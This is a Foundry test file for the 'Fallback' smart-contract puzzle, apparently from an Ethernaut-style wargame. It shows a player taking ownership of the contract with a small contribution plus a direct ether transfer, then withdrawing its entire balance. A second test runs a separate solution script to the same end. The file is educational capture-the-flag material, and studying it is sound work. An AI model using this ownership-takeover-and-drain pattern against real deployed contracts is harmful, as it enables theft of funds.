// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "@puzzles/1/Fallback.sol";
import {FallbackSolution} from "@script/1/FallbackSolution.s.sol";

contract FallbackTest is Test {
    Fallback internal puzzleContract;

    address owner = makeAddr("owner");
    address player = msg.sender;

    uint256 constant STARTING_USER_BALANCE = 100 ether;

    function setUp() public {
        vm.startPrank(owner);
        puzzleContract = new Fallback();
        vm.stopPrank();

        vm.deal(player, STARTING_USER_BALANCE);
    }

    function testSolveFallback() public {
        vm.startPrank(player);
        puzzleContract.contribute{value: 1}();
        (bool success,) = address(puzzleContract).call{value: 1}("");
        assertEq(success, true);
        assertEq(puzzleContract.owner(), player);
        puzzleContract.withdraw();
        assertEq(address(puzzleContract).balance, 0);
        vm.stopPrank();
    }

    function testFallbackSolution() public {
        FallbackSolution solution = new FallbackSolution();
        solution.run(address(puzzleContract));
        assertEq(puzzleContract.owner(), player);
        assertEq(address(puzzleContract).balance, 0);
    }
}
